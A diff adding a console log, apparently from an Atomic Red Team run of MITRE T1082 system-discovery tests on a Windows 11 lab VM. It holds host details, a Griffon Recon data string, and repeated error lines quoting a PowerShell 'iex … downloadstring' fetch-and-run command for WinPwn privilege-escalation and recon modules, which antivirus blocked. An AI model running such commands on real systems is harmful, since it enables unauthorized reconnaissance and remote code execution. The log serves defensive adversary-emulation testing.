@@ -1,0 +1,256 @@
+PathToAtomicsFolder = C:\AtomicRedTeam\atomics
+                                                                                                                        Executing test: T1082-1 System Information Discovery                                                                    Host Name:                     DESKTOP-0R0EQ17
+OS Name:                       Microsoft Windows 11 Enterprise Evaluation
+OS Version:                    10.0.26200 N/A Build 26200
+OS Manufacturer:               Microsoft Corporation
+OS Configuration:              Standalone Workstation
+OS Build Type:                 Multiprocessor Free
+Registered Owner:              Qween
+Registered Organization:       N/A
+Product ID:                    00329-20000-00001-AA484
+Original Install Date:         31/08/2026, 20:03:34
+System Boot Time:              16/09/2026, 17:42:44
+System Manufacturer:           VMware, Inc.
+System Model:                  VMware20,1
+System Type:                   x64-based PC
+Processor(s):                  2 Processor(s) Installed.
+                               [01]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~2112 Mhz
+                               [02]: Intel64 Family 6 Model 142 Stepping 10 GenuineIntel ~2112 Mhz
+BIOS Version:                  VMware, Inc. VMW201.00V.25275966.B64.2603102050, 10/03/2026
+Windows Directory:             C:\WINDOWS
+System Directory:              C:\WINDOWS\system32
+Boot Device:                   \Device\HarddiskVolume1
+System Locale:                 en-us;English (United States)
+Input Locale:                  en-us;English (United States)
+Time Zone:                     (UTC+03:00) Nairobi
+Total Physical Memory:         4,095 MB
+Available Physical Memory:     689 MB
+Virtual Memory: Max Size:      5,375 MB
+Virtual Memory: Available:     1,491 MB
+Virtual Memory: In Use:        3,884 MB
+Page File Location(s):         C:\pagefile.sys
+Domain:                        WORKGROUP
+Logon Server:                  \\DESKTOP-0R0EQ17
+Hotfix(s):                     7 Hotfix(s) Installed.
+                               [01]: KB5126052
+                               [02]: KB5054156
+                               [03]: KB5122035
+                               [04]: KB5129195                                                                                                         [05]: KB5064531                                                                                                         [06]: KB5123304                                                                                                         [07]: KB5124007                                                                          Network Card(s):               2 NIC(s) Installed.                                                                                                     [01]: Intel(R) 82574L Gigabit Network Connection                                                                              Connection Name: Ethernet0                                                                                              DHCP Enabled:    Yes                                                                                                    DHCP Server:     192.168.57.254                                                                                         IP address(es)                                                                                                          [01]: 192.168.57.131                                                                                                    [02]: fe80::7ade:6d0f:f034:d373                                                                                   [02]: Intel(R) 82574L Gigabit Network Connection                                                                              Connection Name: Ethernet1                                                                                              DHCP Enabled:    Yes                                                                                                    DHCP Server:     192.168.218.254                                                                                        IP address(es)                                                                                                          [01]: 192.168.218.135                                                                                                   [02]: fe80::5eef:e64c:d19e:4e2d
+Virtualization-based security: Status: Not enabled
+                               App Control for Business policy: Enforced
+                               App Control for Business user mode policy: Off
+                               Security Features Enabled:
+Hyper-V Requirements:          A hypervisor has been detected. Features required for Hyper-V will not be displayed.
+HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Disk\Enum
+    0    REG_SZ    SCSI\Disk&Ven_NVMe&Prod_VMware_Virtual_N\5&25a13950&0&000000
+    Count    REG_DWORD    0x1
+    NextInstance    REG_DWORD    0x1
+Exit code: 0
+Done executing test: T1082-1 System Information Discovery
+Executing test: T1082-7 Hostname Discovery (Windows)
+DESKTOP-0R0EQ17
+Exit code: 0
+Done executing test: T1082-7 Hostname Discovery (Windows)
+Executing test: T1082-9 Windows MachineGUID Discovery
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography
+    MachineGuid    REG_SZ    39f2ee20-7495-4c70-a3c5-5f7d9ca0bb9d
+Exit code: 0                                                                                                            Done executing test: T1082-9 Windows MachineGUID Discovery                                                              Executing test: T1082-10 Griffon Recon                                                                                  Microsoft (R) Windows Script Host Version 10.0                                                                          Copyright (C) Microsoft Corporation. All rights reserved.                                                               id=000C29FAE183&type=put&Hostname=DESKTOP-0R0EQ17&DomainMember=no&DomainName=WORKGROUP&DomainHosts=-1&UserName=Qween&LogicalDrives=C:;D:;&SystemInfo=Hostname:DESKTOP-0R0EQ17%%%Name_OS:Microsoft Windows 11 Enterprise Evaluation%%%Version_OS:10.0.26200 BuildNumber : 26200%%%Manufacturer_OS:Microsoft Corporation%%%ProductType_OS:%%%BuildType_OS:Multiprocessor Free%%%RegisteredUser:Qween%%%Organization:SerialNumber:00329-20000-00001-AA484%%%InstallDate:31.08.2026, 20:03:34%%%LastBootUpTime:16.09.2026, 17:42:44%%%%%%%%%%%%MaxNumberOfProcesses:-1%%%SystemType:x64-based PC%%%TotalPhysicalMemory:4293677056%%%Domain:WORKGROUP%%%System_manufacturer:VMware, Inc.%%%System_model:VMware20,1%%%Processor1: Intel64 Family 6 Model 142 Stepping 10 ~2112 Mhz%%%Processor2: Intel64 Family 6 Model 142 Stepping 10 ~2112 Mhz%%%BIOS_version:VMW201.00V.25275966.B64.2603102050, VMW201.00V.25275966.B64.2603102050, 10.03.2026%%%WindowsDirectory:C:\WINDOWS%%%SystemDirectory:C:\WINDOWS\system32%%%BootDevice:\Device\HarddiskVolume1%%%OSLanguage:1033;English D%%%MUILanguages:en-US%%%CurrentTimeZone:UTC+03:00%%%%%%FreePhysicalMemory:618984%%%TotalVirtualMemorySize:5503764%%%FreeVirtualMemory:1407380%%%Paging file location1: C:\pagefile.sys%%%QuickFixEngineering_Count-7: %%%QuickFixEngineering1: KB5126052%%%QuickFixEngineering2: KB5054156%%%QuickFixEngineering3: KB5122035%%%QuickFixEngineering4: KB5129195%%%QuickFixEngineering5: KB5064531%%%QuickFixEngineering6: KB5123304%%%QuickFixEngineering7: KB5124007%%%NetworkAdapter_Count -2: %%%NetworkAdapter1: Intel(R) 82574L Gigabit Network Connection%%%Connection name: Ethernet0%%%DHCPEnabled:True%%%DHCPServer:192.168.57.254%%%IPAddress:192.168.57.131,fe80::7ade:6d0f:f034:d373%%%NetworkAdapter2: Intel(R) 82574L Gigabit Network Connection #2%%%Connection name: Ethernet1%%%DHCPEnabled:True%%%DHCPServer:192.168.218.254%%%IPAddress:192.168.218.135,fe80::5eef:e64c:d19e:4e2d%%%&SoftwareInfo=&NetworkInfo=Adapter:Ethernet0%%%DNSDomainSuffix:%%%MACAddress:00:0C:29:FA:E1:79%%%DHCPEnabled:True%%%IPAddress:192.168.57.131,fe80::7ade:6d0f:f034:d373%%%IPSubnet:255.255.255.0,64%%%DefaultIPGateway:192.168.57.2%%%DHCPServer:192.168.57.254%%%DNSServers:192.168.57.2%%%Adapter:Ethernet1%%%DNSDomainSuffix:%%%MACAddress:00:0C:29:FA:E1:83%%%DHCPEnabled:True%%%IPAddress:192.168.218.135,fe80::5eef:e64c:d19e:4e2d%%%IPSubnet:255.255.255.0,64%%%DHCPServer:192.168.218.254%%%DNSServers:192.168.218.1%%%&ProcessList=&DesktopFileList=desktop.ini%%%&DesktopScreenshot=NoScreenshot&WebHistory=nothing&SecurityInfo=Current_user: admin&&&AntiVirus:Windows Defender%%%%%%Admin_privileges: Enabled&UACInfoUAC: On&&&Will you be prompted to allow elevation for administrator: Yes&&&Prompt window for elevation permission: On secure desktop&&&&
+Exit code: 0
+Done executing test: T1082-10 Griffon Recon
+Executing test: T1082-11 Environment variables discovery on windows
+ALLUSERSPROFILE=C:\ProgramData
+APPDATA=C:\Users\Qween\AppData\Roaming
+CommonProgramFiles=C:\Program Files\Common Files
+CommonProgramFiles(x86)=C:\Program Files (x86)\Common Files
+CommonProgramW6432=C:\Program Files\Common Files
+COMPUTERNAME=DESKTOP-0R0EQ17
+ComSpec=C:\WINDOWS\system32\cmd.exe
+DriverData=C:\Windows\System32\Drivers\DriverData
+HOMEDRIVE=C:
+HOMEPATH=\Users\Qween
+LOCALAPPDATA=C:\Users\Qween\AppData\Local
+LOGONSERVER=\\DESKTOP-0R0EQ17                                                                                           NUMBER_OF_PROCESSORS=2                                                                                                  OneDrive=C:\Users\Qween\OneDrive                                                                                        OS=Windows_NT                                                                                                           Path=C:\WINDOWS\system32;C:\WINDOWS;C:\WINDOWS\System32\Wbem;C:\WINDOWS\System32\WindowsPowerShell\v1.0\;C:\WINDOWS\System32\OpenSSH\;C:\Users\Qween\AppData\Local\Microsoft\WindowsApps                                                        PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.VBE;.JS;.JSE;.WSF;.WSH;.MSC;.CPL                                                      PROCESSOR_ARCHITECTURE=AMD64                                                                                            PROCESSOR_IDENTIFIER=Intel64 Family 6 Model 142 Stepping 10, GenuineIntel                                               PROCESSOR_LEVEL=6
+PROCESSOR_REVISION=8e0a
+ProgramData=C:\ProgramData
+ProgramFiles=C:\Program Files
+ProgramFiles(x86)=C:\Program Files (x86)
+ProgramW6432=C:\Program Files
+PROMPT=$P$G
+PSModulePath=C:\Users\Qween\Documents\WindowsPowerShell\Modules;C:\Program Files\WindowsPowerShell\Modules;C:\WINDOWS\system32\WindowsPowerShell\v1.0\Modules
+PUBLIC=C:\Users\Public
+SystemDrive=C:
+SystemRoot=C:\WINDOWS                                                                                                   TEMP=C:\Users\Qween\AppData\Local\Temp                                                                                  TMP=C:\Users\Qween\AppData\Local\Temp                                                                                   USERDOMAIN=DESKTOP-0R0EQ17                                                                                              USERDOMAIN_ROAMINGPROFILE=DESKTOP-0R0EQ17                                                                               USERNAME=Qween                                                                                                          USERPROFILE=C:\Users\Qween                                                                                              windir=C:\WINDOWS                                                                                                       Exit code: 0                                                                                                            Done executing test: T1082-11 Environment variables discovery on windows
+Executing test: T1082-14 WinPwn - winPEAS
+iex : At line:1 char:1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:2 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+                                                                                                                        winPEAS : The term 'winPEAS' is not recognized as the name of a cmdlet, function, script file, or operable program.     Check the spelling of the name, or if a path was included, verify that the path is correct and try again.               At line:3 char:1                                                                                                        + winPEAS -noninteractive -consoleoutput}                                                                               + ~~~~~~~                                                                                                                   + CategoryInfo          : ObjectNotFound: (winPEAS:String) [], CommandNotFoundException                                 + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-14 WinPwn - winPEAS
+Executing test: T1082-15 WinPwn - itm4nprivesc
+iex : At line:1 char:1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:2 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+                                                                                                                        itm4nprivesc : The term 'itm4nprivesc' is not recognized as the name of a cmdlet, function, script file, or operable    program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.      At line:3 char:1                                                                                                        + itm4nprivesc -noninteractive -consoleoutput}                                                                          + ~~~~~~~~~~~~                                                                                                              + CategoryInfo          : ObjectNotFound: (itm4nprivesc:String) [], CommandNotFoundException                            + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-15 WinPwn - itm4nprivesc
+Executing test: T1082-16 WinPwn - Powersploits privesc checks
+iex : At line:1 char:1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:2 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+                                                                                                                        oldchecks : The term 'oldchecks' is not recognized as the name of a cmdlet, function, script file, or operable          program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.      At line:3 char:1                                                                                                        + oldchecks -noninteractive -consoleoutput}                                                                             + ~~~~~~~~~                                                                                                                 + CategoryInfo          : ObjectNotFound: (oldchecks:String) [], CommandNotFoundException                               + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-16 WinPwn - Powersploits privesc checks
+Executing test: T1082-17 WinPwn - General privesc checks
+iex : At line:1 char:1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+At line:2 char:1
+                                                                                                                        otherchecks : The term 'otherchecks' is not recognized as the name of a cmdlet, function, script file, or operable      program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.      At line:3 char:1                                                                                                        + otherchecks -noninteractive -consoleoutput}                                                                               + CategoryInfo          : ObjectNotFound: (otherchecks:String) [], CommandNotFoundException                         + ~~~~~~~~~~~                                                                                                               + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-17 WinPwn - General privesc checks
+Executing test: T1082-18 WinPwn - GeneralRecon
+iex : At line:1 char:1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:2 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+                                                                                                                        Generalrecon : The term 'Generalrecon' is not recognized as the name of a cmdlet, function, script file, or operable    program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.      At line:3 char:1                                                                                                        + Generalrecon -consoleoutput -noninteractive}                                                                          + ~~~~~~~~~~~~                                                                                                              + CategoryInfo          : ObjectNotFound: (Generalrecon:String) [], CommandNotFoundException                            + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-18 WinPwn - GeneralRecon
+Executing test: T1082-19 WinPwn - Morerecon
+iex : At line:1 char:1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:2 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+                                                                                                                        Morerecon : The term 'Morerecon' is not recognized as the name of a cmdlet, function, script file, or operable          program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.      At line:3 char:1                                                                                                        + Morerecon -noninteractive -consoleoutput}                                                                             + ~~~~~~~~~                                                                                                                 + CategoryInfo          : ObjectNotFound: (Morerecon:String) [], CommandNotFoundException                               + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-19 WinPwn - Morerecon
+Executing test: T1082-20 WinPwn - RBCD-Check
+iex : At line:1 char:1
++ #  Global TLS Setting for all functions. If TLS12 isn't suppported yo ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:2 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+                                                                                                                        RBCD-Check : The term 'RBCD-Check' is not recognized as the name of a cmdlet, function, script file, or operable        program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.      At line:3 char:1                                                                                                        + RBCD-Check -consoleoutput -noninteractive}                                                                            + ~~~~~~~~~~                                                                                                                + CategoryInfo          : ObjectNotFound: (RBCD-Check:String) [], CommandNotFoundException                              + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-20 WinPwn - RBCD-Check
+Executing test: T1082-21 WinPwn - PowerSharpPack - Watson searching for missing windows patches
+iex : At line:1 char:1
++ function Invoke-watson
++ ~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:2 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand
+
+Invoke-watson : The term 'Invoke-watson' is not recognized as the name of a cmdlet, function, script file, or operable  program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.      At line:3 char:1                                                                                                        + Invoke-watson}                                                                                                        + ~~~~~~~~~~~~~                                                                                                             + CategoryInfo          : ObjectNotFound: (Invoke-watson:String) [], CommandNotFoundException                           + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-21 WinPwn - PowerSharpPack - Watson searching for missing windows patches                    Executing test: T1082-22 WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
+iex : At line:1 char:1
++ function Invoke-SharpUp
++ ~~~~~~~~~~~~~~~~~~~~~~~
+This script contains malicious content and has been blocked by your antivirus software.
+At line:2 char:1
++ iex(new-object net.webclient).downloadstring('https://raw.githubuserc ...
++ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ParserError: (:) [Invoke-Expression], ParseException
+    + FullyQualifiedErrorId : ScriptContainedMaliciousContent,Microsoft.PowerShell.Commands.InvokeExpressionCommand                                                                                                                             Invoke-SharpUp : The term 'Invoke-SharpUp' is not recognized as the name of a cmdlet, function, script file, or         operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try    again.                                                                                                                  At line:3 char:1                                                                                                        + Invoke-SharpUp -command "audit"}                                                                                      + ~~~~~~~~~~~~~~                                                                                                            + CategoryInfo          : ObjectNotFound: (Invoke-SharpUp:String) [], CommandNotFoundException                          + FullyQualifiedErrorId : CommandNotFoundException
+Exit code: 0
+Done executing test: T1082-22 WinPwn - PowerSharpPack - Sharpup checking common Privesc vectors
+Executing test: T1082-23 WinPwn - PowerSharpPack - Seatbelt
+Exception calling "Load" with "1" argument(s): "Could not load file or assembly '608256 bytes loaded from Anonymously
+Hosted DynamicMethods Assembly, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null' or one of its dependencies. An
+attempt was made to load a program with an incorrect format."
+At line:14 char:5
++     $RAS = [System.Reflection.Assembly]::Load($byteOutArray)
++     ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : BadImageFormatException
+
+Unable to find type [AnschnallGurt.Program].
+At line:22 char:5
++     [AnschnallGurt.Program]::Main($Command)
++     ~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (AnschnallGurt.Program:TypeName) [], RuntimeException
+    + FullyQualifiedErrorId : TypeNotFound
+Exit code: 0
+Done executing test: T1082-23 WinPwn - PowerSharpPack - Seatbelt
+Executing test: T1082-24 Azure Security Scan with SkyArk
+Import-Module : The specified module 'C:\AtomicRedTeam\atomics\..\ExternalPayloads\AzureStealth.ps1' was not loaded
+because no valid module file was found in any module directory.
+At line:1 char:4
++ & {Import-Module "C:\AtomicRedTeam\atomics\..\ExternalPayloads\AzureS ...
++    ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ResourceUnavailable: (C:\AtomicRedTea...zureStealth.ps1:String) [Import-Module], FileNot
+   FoundException
+    + FullyQualifiedErrorId : Modules_ModuleNotFound,Microsoft.PowerShell.Commands.ImportModuleCommand
+
+New-Object : Exception calling ".ctor" with "2" argument(s): "Cannot process argument because the value of argument
+"userName" is not valid. Change the value of the "userName" argument and run the operation again."
+At line:3 char:15
++ ... redential = New-Object -TypeName System.Management.Automation.PSCrede ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (:) [New-Object], MethodInvocationException
+    + FullyQualifiedErrorId : ConstructorInvokedThrowException,Microsoft.PowerShell.Commands.NewObjectCommand                                                                                                                                   Connect-AzAccount : The term 'Connect-AzAccount' is not recognized as the name of a cmdlet, function, script file, or   operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try    again.                                                                                                                  At line:4 char:1                                                                                                        + Connect-AzAccount -Credential $Credential                                                                             + ~~~~~~~~~~~~~~~~~                                                                                                         + CategoryInfo          : ObjectNotFound: (Connect-AzAccount:String) [], CommandNotFoundException                       + FullyQualifiedErrorId : CommandNotFoundException
+
+Connect-AzureAD : The term 'Connect-AzureAD' is not recognized as the name of a cmdlet, function, script file, or
+operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
+again.
+At line:5 char:1
++ Connect-AzureAD -Credential $Credential
++ ~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (Connect-AzureAD:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+Scan-AzureAdmins : The term 'Scan-AzureAdmins' is not recognized as the name of a cmdlet, function, script file, or
+operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
+again.
+At line:6 char:1
++ Scan-AzureAdmins -UseCurrentCred}
++ ~~~~~~~~~~~~~~~~                                                                                                          + CategoryInfo          : ObjectNotFound: (Scan-AzureAdmins:String) [], CommandNotFoundException                        + FullyQualifiedErrorId : CommandNotFoundException                                                                  Exit code: 0                                                                                                            Done executing test: T1082-24 Azure Security Scan with SkyArk                                                           Executing test: T1082-27 System Information Discovery with WMIC                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'wmic' is not recognized as an internal or external command,                                                            operable program or batch file.                                                                                         'Get-WmiObject' is not recognized as an internal or external command,                                                   operable program or batch file.                                                                                         Exit code: 1                                                                                                            Done executing test: T1082-27 System Information Discovery with WMIC                                                    Executing test: T1082-28 System Information Discovery                                                                   Process Timed out after 120 seconds, use '-TimeoutSeconds' to specify a different timeout                               Exit code: -1                                                                                                           Done executing test: T1082-28 System Information Discovery                                                              Executing test: T1082-29 Check computer location                                                                        HKEY_CURRENT_USER\Control Panel\International\Geo                                                                           Nation    REG_SZ    129                                                                                                 Name    REG_SZ    KE                                                                                                Exit code: 0                                                                                                            Done executing test: T1082-29 Check computer location                                                                   Executing test: T1082-30 BIOS Information Discovery through Registry                                                    HKEY_LOCAL_MACHINE\HARDWARE\DESCRIPTION\System                                                                              SystemBiosVersion    REG_MULTI_SZ    INTEL  - 6040000\0VMW201.00V.25275966.B64.2603102050\0VMware, Inc. - 10000     ERROR: The system was unable to find the specified registry key or value.                                               Exit code: 1                                                                                                            Done executing test: T1082-30 BIOS Information Discovery through Registry                                               Executing test: T1082-31 ESXi - VM Discovery using ESXCLI                                                               '"C:\AtomicRedTeam\atomics\..\ExternalPayloads\plink.exe"' is not recognized as an internal or external command,        operable program or batch file.                                                                                         Exit code: 255                                                                                                          Done executing test: T1082-31 ESXi - VM Discovery using ESXCLI                                                          Executing test: T1082-32 ESXi - Darkside system information discovery                                                   '"C:\AtomicRedTeam\atomics\..\ExternalPayloads\plink.exe"' is not recognized as an internal or external command,        operable program or batch file.                                                                                         Exit code: 255                                                                                                          Done executing test: T1082-32 ESXi - Darkside system information discovery                                              Executing test: T1082-34 operating system discovery                                                                     Exit code: 0                                                                                                            Done executing test: T1082-34 operating system discovery                                                                Executing test: T1082-35 Check OS version via "ver" command                                                             Microsoft Windows [Version 10.0.26200.9457]                                                                             Exit code: 0                                                                                                            Done executing test: T1082-35 Check OS version via "ver" command                                                        Executing test: T1082-36 Display volume shadow copies with "vssadmin"                                                   vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool                                              (C) Copyright 2001-2013 Microsoft Corp.                                                                                 No items found that satisfy the query.                                                                                  Exit code: 1                                                                                                            Done executing test: T1082-36 Display volume shadow copies with "vssadmin"
+Executing test: T1082-37 Identify System Locale and Regional Settings with PowerShell
+Exit code: 0                                                                                                            Done executing test: T1082-37 Identify System Locale and Regional Settings with PowerShell                              Executing test: T1082-38 Enumerate Available Drives via gdr                                                             Name           Used (GB)     Free (GB) Provider      Root                                               CurrentLocation ----           ---------     --------- --------      ----                                               --------------- C                  29.06         33.89 FileSystem    C:\                                 Users\Qween\AppData\Local\Temp D                   6.61          0.00 FileSystem    D:\                                                                Exit code: 0                                                                                                            Done executing test: T1082-38 Enumerate Available Drives via gdr
+Executing test: T1082-39 Discover OS Product Name via Registry
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+    ProductName    REG_SZ    Windows 10 Enterprise Evaluation
+Exit code: 0
+Done executing test: T1082-39 Discover OS Product Name via Registry
+Executing test: T1082-40 Discover OS Build Number via Registry
+CurrentBuildNumber    REG_SZ    26200
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion
+Exit code: 0
+Done executing test: T1082-40 Discover OS Build Number via Registry
+Executing test: T1082-41 Get System Hardware UUID Via wmic.exe
+wmic : The term 'wmic' is not recognized as the name of a cmdlet, function, script file, or operable program. Check
+At line:1 char:4
++ & {wmic csproduct get UUID}
++    ~~~~
+    + CategoryInfo          : ObjectNotFound: (wmic:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+
+the spelling of the name, or if a path was included, verify that the path is correct and try again.
+Exit code: 0
+Done executing test: T1082-41 Get System Hardware UUID Via wmic.exe
